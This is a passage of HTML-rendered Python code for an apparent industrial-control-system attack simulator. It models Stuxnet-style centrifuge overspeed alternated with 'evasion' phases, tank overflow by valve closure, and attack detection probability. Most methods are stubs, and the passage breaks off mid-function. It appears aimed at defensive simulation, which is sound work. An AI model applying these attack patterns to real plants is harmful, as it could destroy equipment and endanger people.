Code\u003c/span\u003e\n\n\u003cspan class=\"pl-s\"\u003e``\u003c/span\u003e`\u003cspan class=\"pl-s1\"\u003epython\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eclass\u003c/span\u003e \u003cspan class=\"pl-v\"\u003eKineticAttackSimulator\u003c/span\u003e:\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003e__init__\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003esimulation_platform\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e'FactoryIO'\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        CRITICAL INDUSTRIAL SECURITY NOTICE: This class simulates kinetic cyber attacks\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        on industrial control systems for authorized research and defensive testing ONLY.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        AUTHORIZED USE CASES:\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Industrial control system resilience testing in isolated environments\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Red team exercises with proper oversight and authorization\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Physical consequence analysis and risk assessment\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Safety system validation and improvement\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        STRICT PROHIBITIONS:\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - NEVER use on operational industrial systems\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Do not deploy in production environments\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Ensure complete isolation from live processes\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Follow all safety protocols and emergency procedures\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        INDUSTRY STANDARDS COMPLIANCE:\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - ISA 95 (Enterprise-Control System Integration)\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - IEC 62443 (Industrial Communication Networks)\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - NIST SP 800-82 (Industrial Control System Security)\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - OSHA 1910 (Occupational Safety and Health Standards)\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eplatform\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003esimulation_platform\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-s1\"\u003ephysical_model\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-s1\"\u003eload_physical_model\u003c/span\u003e()\n        \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esafety_systems\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-s1\"\u003einitialize_safety_monitoring\u003c/span\u003e()\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003esimulate_physical_impact_attacks\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Execute comprehensive kinetic attack simulations across multiple industrial scenarios.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Each scenario tests different physical impact vectors and their consequences.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eattack_scenarios\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'centrifuge_destruction'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esimulate_centrifuge_attack\u003c/span\u003e,\n            \u003cspan class=\"pl-s\"\u003e'tank_overflow'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esimulate_tank_overflow\u003c/span\u003e,\n            \u003cspan class=\"pl-s\"\u003e'pump_cavitation'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esimulate_pump_cavitation\u003c/span\u003e,\n            \u003cspan class=\"pl-s\"\u003e'valve_manipulation'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esimulate_valve_attack\u003c/span\u003e,\n            \u003cspan class=\"pl-s\"\u003e'motor_overload'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esimulate_motor_overload\u003c/span\u003e\n        }\n        \n        \u003cspan class=\"pl-s1\"\u003esimulation_results\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {}\n        \n        \u003cspan class=\"pl-s1\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003escenario_name\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003escenario_func\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eattack_scenarios\u003c/span\u003e.\u003cspan class=\"pl-s1\"\u003eitems\u003c/span\u003e():\n            \u003cspan class=\"pl-k\"\u003eprint\u003c/span\u003e(f\"[\u003cspan class=\"pl-c1\"\u003e*\u003c/span\u003e] \u003cspan class=\"pl-v\"\u003eSimulating\u003c/span\u003e {\u003cspan class=\"pl-s1\"\u003escenario_name\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ereplace\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e'_'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e' '\u003c/span\u003e).\u003cspan class=\"pl-c1\"\u003etitle\u003c/span\u003e()}...\")\n            \u003cspan class=\"pl-s1\"\u003eimpact_metrics\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003escenario_func\u003c/span\u003e()\n            \u003cspan class=\"pl-s1\"\u003eanalysis_results\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-s1\"\u003eanalyze_kinetic_impact\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eimpact_metrics\u003c/span\u003e)\n            \u003cspan class=\"pl-s1\"\u003esimulation_results\u003c/span\u003e[\u003cspan class=\"pl-s1\"\u003escenario_name\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eanalysis_results\u003c/span\u003e\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003esimulation_results\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003esimulate_centrifuge_attack\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Simulate Stuxnet-style centrifuge destruction through speed manipulation.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Models mechanical stress accumulation and progressive equipment failure.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Normal operational parameters for baseline comparison\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003enormal_speed\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e800\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e# Hz - Standard operating frequency\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003enormal_vibration\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e2.5\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e# mm/s - Acceptable vibration level\u003c/span\u003e\n        \n        \u003cspan class=\"pl-c\"\u003e# Attack sequence: Alternating destructive and normal operation phases\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eattack_phases\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e [\n            {\u003cspan class=\"pl-s\"\u003e'duration'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e60\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'speed'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e1410\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'vibration'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e8.2\u003c/span\u003e},  \u003cspan class=\"pl-c\"\u003e# Destructive overspeed\u003c/span\u003e\n            {\u003cspan class=\"pl-s\"\u003e'duration'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e30\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'speed'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e800\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'vibration'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e2.5\u003c/span\u003e},   \u003cspan class=\"pl-c\"\u003e# Normal operation (evasion)\u003c/span\u003e\n            {\u003cspan class=\"pl-s\"\u003e'duration'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e60\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'speed'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e1410\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'vibration'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e9.1\u003c/span\u003e},  \u003cspan class=\"pl-c\"\u003e# Destructive overspeed\u003c/span\u003e\n        ]\n        \n        \u003cspan class=\"pl-s1\"\u003ecumulative_damage\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003ephase_analysis\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e []\n        \n        \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ephase_num\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003ephase\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eenumerate\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eattack_phases\u003c/span\u003e):\n            \u003cspan class=\"pl-c\"\u003e# Calculate mechanical stress for each attack phase\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003ephase_damage\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecalculate_mechanical_stress\u003c/span\u003e(\n                \u003cspan class=\"pl-s1\"\u003ephase\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'speed'\u003c/span\u003e], \n                \u003cspan class=\"pl-s1\"\u003ephase\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'vibration'\u003c/span\u003e], \n                \u003cspan class=\"pl-s1\"\u003ephase\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'duration'\u003c/span\u003e]\n            )\n            \u003cspan class=\"pl-s1\"\u003ecumulative_damage\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ephase_damage\u003c/span\u003e\n            \n            \u003cspan class=\"pl-s1\"\u003ephase_analysis\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eappend\u003c/span\u003e({\n                \u003cspan class=\"pl-s\"\u003e'phase'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003ephase_num\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'duration_seconds'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003ephase\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'duration'\u003c/span\u003e],\n                \u003cspan class=\"pl-s\"\u003e'speed_hz'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003ephase\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'speed'\u003c/span\u003e],\n                \u003cspan class=\"pl-s\"\u003e'vibration_mm_s'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003ephase\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'vibration'\u003c/span\u003e],\n                \u003cspan class=\"pl-s\"\u003e'phase_damage'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003ephase_damage\u003c/span\u003e\n            })\n        \n        \u003cspan class=\"pl-s1\"\u003ereturn\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'cumulative_damage'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003ecumulative_damage\u003c/span\u003e,\n            \u003cspan class=\"pl-s\"\u003e'failure_prediction'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003epredict_failure_time\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003ecumulative_damage\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'detection_probability'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecalculate_detection_risk\u003c/span\u003e(),\n            \u003cspan class=\"pl-s\"\u003e'phase_analysis'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003ephase_analysis\u003c/span\u003e,\n            \u003cspan class=\"pl-s\"\u003e'equipment_replacement_cost'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eestimate_replacement_cost\u003c/span\u003e(),\n            \u003cspan class=\"pl-s\"\u003e'production_loss'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecalculate_production_downtime\u003c/span\u003e()\n        }\n\n    \u003cspan class=\"pl-s1\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003esimulate_tank_overflow\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Simulate tank overflow attack through outflow valve manipulation.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Models fluid dynamics, containment failure, and environmental impact.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Physical process parameters for realistic simulation\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003etank_capacity\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e10000\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e# liters - Maximum safe capacity\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003einflow_rate\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e500\u003c/span\u003e      \u003cspan class=\"pl-c\"\u003e# liters/minute - Normal inflow rate\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eoutflow_rate\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e300\u003c/span\u003e     \u003cspan class=\"pl-c\"\u003e# liters/minute - Normal outflow rate\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003esafety_margin\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0.9\u003c/span\u003e    \u003cspan class=\"pl-c\"\u003e# 90% capacity safety threshold\u003c/span\u003e\n        \n        \u003cspan class=\"pl-c\"\u003e# Attack simulation: Close outflow valve while maintaining inflow\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003esimulation_time\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e    \u003cspan class=\"pl-c\"\u003e# minutes\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003etank_level\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e5000\u003c/span\u003e      \u003cspan class=\"pl-c\"\u003e# liters - Starting level (50% capacity)\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eoverflow_occurred\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eFalse\u003c/span\u003e\n        \n        \u003cspan class=\"pl-k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003etank_level\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003etank_capacity\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eand\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003esimulation_time\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e120\u003c/span\u003e:  \u003cspan class=\"pl-c\"\u003e# 2-hour max simulation\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003esimulation_time\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e# minute increment\u003c/span\u003e\n            \n            \u003cspan class=\"pl-c\"\u003e# Attack: Outflow valve closed (0 outflow), normal inflow continues\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003etank_level\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e (\u003cspan class=\"pl-s1\"\u003einflow_rate\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e-\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e)  \u003cspan class=\"pl-c\"\u003e# Outflow valve closed by attacker\u003c/span\u003e\n            \n            \u003cspan class=\"pl-c\"\u003e# Check for overflow condition\u003c/span\u003e\n            \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003etank_level\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e\u0026gt;=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003etank_capacity\u003c/span\u003e:\n                \u003cspan class=\"pl-s1\"\u003eoverflow_occurred\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eTrue\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003ebreak\u003c/span\u003e\n        \n        \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eoverflow_occurred\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e {\n                \u003cspan class=\"pl-s\"\u003e'overflow_time'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003esimulation_time\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'environmental_impact'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecalculate_environmental_damage\u003c/span\u003e(),\n                \u003cspan class=\"pl-s\"\u003e'safety_system_response'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003echeck_safety_systems\u003c/span\u003e(),\n                \u003cspan class=\"pl-s\"\u003e'material_loss'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecalculate_material_loss\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etank_level\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e-\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003etank_capacity\u003c/span\u003e),\n                \u003cspan class=\"pl-s\"\u003e'cleanup_cost'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eestimate_cleanup_operations\u003c/span\u003e()\n            }\n        \u003cspan class=\"pl-k\"\u003eelse\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e {\n                \u003cspan class=\"pl-s\"\u003e'overflow_time'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003eNone\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'environmental_impact'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'No overflow occurred'\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'safety_system_response'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Systems maintained control'\u003c/span\u003e\n            }\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003esimulate_pump_cavitation\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Simulate pump destruction through cavitation induction\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Implementation for pump cavitation simulation\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003ereturn\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'cavitation_severity'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecalculate_cavitation_damage\u003c/span\u003e(),\n            \u003cspan class=\"pl-s\"\u003e'pump_failure_time'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003epredict_pump_failure\u003c/span\u003e(),\n            \u003cspan class=\"pl-s\"\u003e'maintenance_impact'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eassess_maintenance_requirements\u003c/span\u003e()\n        }\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003esimulate_valve_attack\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Simulate process disruption through valve manipulation\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Implementation for valve manipulation attacks\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003ereturn\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'process_disruption'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecalculate_process_impact\u003c/span\u003e(),\n            \u003cspan class=\"pl-s\"\u003e'equipment_stress'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eassess_equipment_stress\u003c/span\u003e(),\n            \u003cspan class=\"pl-s\"\u003e'recovery_time'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eestimate_recovery_duration\u003c/span\u003e()\n        }\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003esimulate_motor_overload\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Simulate motor destruction through current and thermal overload\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Implementation for motor overload simulation\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003ereturn\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'thermal_damage'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecalculate_thermal_stress\u003c/span\u003e(),\n            \u003cspan class=\"pl-s\"\u003e'insulation_failure'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003epredict_insulation_failure\u003c/span\u003e(),\n            \u003cspan class=\"pl-s\"\u003e'replacement_cost'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eestimate_motor_replacement\u003c/span\u003e()\n        }\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ecalculate_mechanical_stress\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003espeed\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003evibration\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eduration\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Calculate mechanical stress accumulation based on operating conditions\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Implementation would use mechanical engineering formulas\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003estress_factor\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e (\u003cspan class=\"pl-s1\"\u003espeed\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e/\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e800\u003c/span\u003e) \u003cspan class=\"pl-c1\"\u003e**\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e2\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e*\u003c/span\u003e (\u003cspan class=\"pl-s1\"\u003evibration\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e/\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e2.5\u003c/span\u003e)  \u003cspan class=\"pl-c\"\u003e# Relative to normal\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003estress_factor\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e*\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eduration\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003epredict_failure_time\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003ecumulative_damage\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Predict equipment failure time based on accumulated damage\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003efailure_threshold\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e1000\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e# Arbitrary failure threshold for simulation\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eremaining_life\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003emax\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003efailure_threshold\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e-\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ecumulative_damage\u003c/span\u003e)\n        \u003cspan class=\"pl-s1\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eremaining_life\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ecalculate_detection_risk\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Calculate probability of attack detection by monitoring systems\"\"\"\u003c/span\u003e\n        \u003cspan 